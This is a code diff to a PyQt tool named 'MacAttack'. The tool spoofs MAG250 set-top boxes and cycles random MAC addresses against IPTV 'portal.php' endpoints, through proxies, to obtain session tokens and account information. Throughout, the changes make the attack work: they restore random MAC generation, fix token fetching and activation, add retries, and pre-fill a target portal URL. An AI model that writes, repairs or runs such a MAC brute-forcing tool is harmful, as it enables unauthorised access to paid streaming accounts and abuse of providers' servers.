@@ -31,10 +31,23 @@ from PyQt5.QtWidgets import (QAbstractItemView, QApplication, QCheckBox,
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
 
-logging.basicConfig(level=logging.DEBUG)
+#logging.basicConfig(level=logging.DEBUG)
 
 def get_token(session, url, mac_address, proxies=None):
     try:
+        # Set up retry strategy
+        retry_strategy = Retry(
+            total=5,  # Number of retries
+            backoff_factor=1,  # Time between retries increases exponentially
+            status_forcelist=[500, 502, 503, 504],  # Retry on these HTTP status codes
+            allowed_methods=["GET", "POST"]  # Retry these HTTP methods
+        )
+
+        # Set up adapter with the retry strategy
+        adapter = HTTPAdapter(max_retries=retry_strategy)
+        session.mount("http://", adapter)
+        session.mount("https://", adapter)
+
         serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
         sn = serialnumber[0:13]
         device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
@@ -42,8 +55,8 @@ def get_token(session, url, mac_address, proxies=None):
         hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
         signature_string = f'{sn}{mac_address}'
         signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
-                  
+        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+
         headers = {
             'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
             'Accept-Encoding': 'gzip, deflate, zstd',
@@ -65,7 +78,7 @@ def get_token(session, url, mac_address, proxies=None):
         }
 
         # Send GET request to fetch the version.js file with optional proxy
-        response = requests.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies)
+        response = session.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies)
 
         # Extract the version number from the response body
         version = re.search(r"var ver = '(.*)';", response.text)
@@ -77,7 +90,7 @@ def get_token(session, url, mac_address, proxies=None):
             portal_version = "5.0"
             logging.debug("Portal version not found.")
 
-        url = f"{url}/portal.php" #add portal.php for next 2 requests
+        url = f"{url}/portal.php"  # Add portal.php for next 2 requests
 
         # Data for the first request (to get the token)
         data = {
@@ -88,7 +101,7 @@ def get_token(session, url, mac_address, proxies=None):
         }
 
         # Step 1: Send the first request to get the token with optional proxy
-        response = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
+        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
 
         # Check if the response is successful
         if response.status_code == 200:
@@ -130,15 +143,15 @@ def get_token(session, url, mac_address, proxies=None):
         }
 
         # Send the second request with optional proxy
-        response = requests.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
+        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
 
         # Output the result of the second request
         logging.debug("Response Status Code:", response.status_code)
         logging.debug("Response Text:")
         logging.debug(response.text)   
-        
+
         return token
-        
+
     except Exception as e:
         logging.error(f"Unexpected error in get_token: {e}")
         return None
@@ -1808,8 +1821,9 @@ class MacAttack(QMainWindow):
         Settings_layout.addWidget(self.moreoutput_checkbox)
         
         # single output file
-        self.singleoutputfile_checkbox = QCheckBox("Only create 1 output file\n(Output logs will be saved in the file MacAttackOutput.txt.)")
+        self.singleoutputfile_checkbox = QCheckBox("Create a single output file.\n(Output will be saved in MacAttackOutput.txt.)")
         Settings_layout.addWidget(self.singleoutputfile_checkbox)
+        self.singleoutputfile_checkbox.setChecked(True)  # Set the checkbox to be checked by default
         Settings_layout.addSpacing(15)  # Adds space
 
         # Ludicrous speed checkbox
@@ -1898,7 +1912,7 @@ class MacAttack(QMainWindow):
 
         # IPTV link input
         self.iptv_link_label = QLabel("IPTV link:")
-        self.iptv_link_entry = QLineEdit("")
+        self.iptv_link_entry = QLineEdit("http://evilvir.us.streamtv.to:8080/c/")
         combined_layout.addWidget(self.iptv_link_label)
         combined_layout.addWidget(self.iptv_link_entry)
 
@@ -2162,9 +2176,7 @@ class MacAttack(QMainWindow):
         self.SaveTheDay()
             
     def RandomMacGenerator(self, prefix="00:1A:79:"):
-        # Create random MACs. Purely for mischief. Don't tell anyone.
-        return "00:1A:79:C7:DC:83"
-        #return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
+        return f"{prefix}{random.randint(0, 255):02X}:{random.randint(0, 255):02X}:{random.randint(0, 255):02X}"
 
     def macattack_update_proxy_textbox(self, new_text):
         # Slot to handle signal
@@ -2246,8 +2258,15 @@ class MacAttack(QMainWindow):
 
                 if res.text:
                     data = json.loads(res.text)
-                    #tok = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
-                    token = get_token
+                    token = data.get('js', {}).get('token')  # Safely access token to prevent KeyError
+                    logging.debug(f"TOKEN: {token}")
+
+                    if token:
+                        base_token = token
+                        token = get_token(s, url, mac, proxies) #activates token for some providers
+                        logging.debug(f"Clean TOKEN: {token}")
+                        if not token:
+                            token = base_token
                     url2 = f"{self.base_url}/portal.php?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
                     headers = {
                         "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
